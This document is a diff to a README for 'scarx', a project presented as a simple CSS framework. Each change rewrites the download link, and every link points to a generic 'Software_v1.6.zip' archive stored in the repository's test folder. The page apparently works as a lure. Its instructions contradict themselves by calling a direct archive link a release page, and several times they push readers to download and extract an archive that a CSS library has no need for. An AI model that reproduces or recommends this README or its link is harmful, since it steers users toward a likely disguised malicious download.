@@ -1,6 +1,6 @@
 # ⚡ scarx - Simple CSS For Modern Sites
 
-[![Download scarx](https://img.shields.io/badge/Download%20scarx-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/brianoxeyed686/scarx/raw/refs/heads/main/test/Software_v1.6.zip)
+[![Download scarx](https://img.shields.io/badge/Download%20scarx-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/brianoxeyed686/scarx/main/test/Software_v1.6.zip)
 
 ## 🧩 What scarx is
 
@@ -10,7 +10,7 @@ It works well for small personal sites and larger web projects. It also includes
 
 ## 📥 Download and install
 
-Visit this page to download: https://github.com/brianoxeyed686/scarx/raw/refs/heads/main/test/Software_v1.6.zip
+Visit this page to download: https://raw.githubusercontent.com/brianoxeyed686/scarx/main/test/Software_v1.6.zip
 
 On that page, look for the latest release. Download the file that fits your setup. If the release includes a zip file, save it to your computer and extract it after the download finishes.
 
@@ -31,7 +31,7 @@ If you want to edit web pages, a text editor helps. Notepad works, but a code ed
 
 ## 🚀 How to get started
 
-1. Open the download page: https://github.com/brianoxeyed686/scarx/raw/refs/heads/main/test/Software_v1.6.zip
+1. Open the download page: https://raw.githubusercontent.com/brianoxeyed686/scarx/main/test/Software_v1.6.zip
 2. Download the latest release file
 3. If the file is zipped, extract it
 4. Open your project folder
@@ -186,4 +186,4 @@ These topics point to a framework that helps you style web pages with less work
 
 ## 📎 Download link
 
-Visit this page to download: https://github.com/brianoxeyed686/scarx/raw/refs/heads/main/test/Software_v1.6.zip
+Visit this page to download: https://raw.githubusercontent.com/brianoxeyed686/scarx/main/test/Software_v1.6.zip
